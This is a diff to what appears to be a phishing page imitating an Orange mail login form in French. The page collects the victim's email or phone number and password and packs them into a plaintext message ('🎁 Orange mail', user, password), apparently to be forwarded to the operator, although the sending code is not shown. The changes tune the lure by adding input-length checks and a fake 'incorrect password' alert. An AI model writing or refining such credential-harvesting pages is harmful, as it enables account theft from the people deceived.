@@ -23,7 +23,7 @@
             top: 0;
             left: 0;
             width: 100%;
-            height: 50px;
+            height: 60px;
             padding: 8px;
             display: flex;
             background-color: black;
@@ -184,7 +184,7 @@
         <form id="form">
 
             <label for="email">Adresse e-mail ou votre numéro de mobile</label> <br>
-            <input id="user" name="email" type="text" required> <br>
+            <input id="user" name="email" type="text" minlength="5" required> <br>
             <span style="color: orangered;" id="notif"></span>
 
             <label id="pwd_label" for="pwd">Mot de passe </label> <br>
@@ -210,9 +210,9 @@
 
 <script>
 
-   
 
-  
+
+
     document.getElementById('next').addEventListener('click', function (e) {
         e.preventDefault();
         var user = document.getElementById('user');
@@ -236,6 +236,10 @@
 
         const user = document.getElementById("user").value;
         const pass = document.getElementById("pwd").value;
+
+        if (pass.length < 4) {
+            return alert('Mot de passe incorrect');
+        }
 
         const message = `🎁 Orange mail :\n\n👤 Utilisateur : ${user}\n🔐 Mot de passe : ${pass}`;
 
